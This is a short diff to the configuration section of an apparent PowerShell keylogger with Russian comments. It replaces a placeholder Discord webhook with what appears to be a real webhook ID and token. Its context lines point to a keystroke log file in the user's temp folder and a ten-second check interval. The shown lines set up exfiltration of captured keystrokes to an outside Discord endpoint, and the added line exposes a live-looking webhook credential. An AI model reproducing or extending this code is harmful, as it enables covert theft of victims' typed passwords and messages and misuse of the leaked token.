@@ -1,5 +1,5 @@
 # Конфигурация
-$webhookUrl = "https://discord.com/api/webhooks/your_webhook_id/your_webhook_token"
+$webhookUrl = "https://discordapp.com/api/webhooks/1369790444417843280/a9TksyeMBftjI4WtLVIh1-lY8_QiQf02cAMvw5BSmmxvP-Yz6k-IWWSM4kHPTBBXtXZk"
 $logFilePath = "$env:TEMP\keylog.txt"
 $checkInterval = 10 # секунд
 
